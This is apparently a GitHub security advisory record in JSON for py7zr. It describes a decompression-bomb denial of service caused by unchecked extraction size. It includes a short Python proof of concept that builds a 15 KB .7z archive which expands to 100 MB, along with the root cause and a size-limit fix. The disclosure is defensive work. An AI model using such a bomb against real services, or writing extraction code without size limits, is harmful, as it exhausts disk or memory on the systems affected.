{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/247577080?v=4", "events_url": "https://api.github.com/users/BudongJW/events{/privacy}", "followers_url": "https://api.github.com/users/BudongJW/followers", "following_url": "https://api.github.com/users/BudongJW/following{/other_user}", "gists_url": "https://api.github.com/users/BudongJW/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/BudongJW", "id": 247577080, "login": "BudongJW", "node_id": "U_kgDODsG5-A", "organizations_url": "https://api.github.com/users/BudongJW/orgs", "received_events_url": "https://api.github.com/users/BudongJW/received_events", "repos_url": "https://api.github.com/users/BudongJW/repos", "site_admin": false, "starred_url": "https://api.github.com/users/BudongJW/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BudongJW/subscriptions", "type": "User", "url": "https://api.github.com/users/BudongJW", "user_view_type": "public"}}], "cve_id": "CVE-2026-55195", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 6.9, "vector_string": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"}}, "cwes": [{"cwe_id": "CWE-409", "name": "Improper Handling of Highly Compressed Data (Data Amplification)"}], "description": "py7zr's `Worker.decompress()` extracts archive entries without tracking total decompressed size. A crafted `.7z` file can exhaust disk or memory before the extraction completes.

Measured: 15.6 KB archive → 100 MB output (6,556:1 ratio).

**Proof of concept:**

```python
import py7zr, tempfile, os

# create bomb: compress 100MB of zeros into ~15KB
bomb_path = tempfile.mktemp(suffix='.7z')
with py7zr.SevenZipFile(bomb_path, 'w') as z:
    import io
    z.writef(io.BytesIO(b'\x00' * 100 * 1024 * 1024), 'bomb.bin')

print(f'archive size: {os.path.getsize(bomb_path):,} bytes')

# extract — no size check
with py7zr.SevenZipFile(bomb_path, 'r') as z:
    z.extractall(path=tempfile.mkdtemp())

print('extracted 100 MB from ~15 KB archive')
```

**Root cause:** `Worker.decompress()` in `py7zr/worker.py` writes decompressed data directly to disk without a running total or configurable size limit. There is no equivalent of Python's `zipfile` `max_size` parameter.

**Fix:** track cumulative decompressed bytes and raise before writing if a limit is exceeded:

```python
MAX_EXTRACT_SIZE = 2 * 1024 ** 3  # 2 GB default, configurable

total = 0
for chunk in decompressed_chunks:
    total += len(chunk)
    if total > MAX_EXTRACT_SIZE:
        raise py7zr.exceptions.DecompressionBombError(
            f'Extraction aborted: decompressed size exceeded {MAX_EXTRACT_SIZE} bytes'
        )
    outfile.write(chunk)
```

Tested on py7zr 0.22.0, Python 3.12, Ubuntu 22.04.", "epss": {"percentage": 0.00321, "percentile": 0.23992}, "ghsa_id": "GHSA-gjrg-mpp7-g774", "github_reviewed_at": "2026-06-19T21:16:29Z", "html_url": "https://github.com/advisories/GHSA-gjrg-mpp7-g774", "identifiers": [{"type": "GHSA", "value": "GHSA-gjrg-mpp7-g774"}, {"type": "CVE", "value": "CVE-2026-55195"}], "nvd_published_at": null, "published_at": "2026-06-19T21:16:29Z", "references": ["https://github.com/miurahr/py7zr/security/advisories/GHSA-gjrg-mpp7-g774", "https://github.com/miurahr/py7zr/releases/tag/v1.1.3", "https://github.com/advisories/GHSA-gjrg-mpp7-g774"], "repository_advisory_url": "https://api.github.com/repos/miurahr/py7zr/security-advisories/GHSA-gjrg-mpp7-g774", "severity": "medium", "source_code_location": "https://github.com/miurahr/py7zr", "summary": "py7zr: Decompression bomb (zip bomb) denial of service via unchecked extraction size", "type": "reviewed", "updated_at": "2026-06-19T21:16:31Z", "url": "https://api.github.com/advisories/GHSA-gjrg-mpp7-g774", "vulnerabilities": [{"first_patched_version": "1.1.3", "package": {"ecosystem": "pip", "name": "py7zr"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 1.1.2"}], "withdrawn_at": null}

reasons: 資産不一致または判定情報不足

title: py7zr: Decompression bomb (zip bomb) denial of service via unchecked extraction size
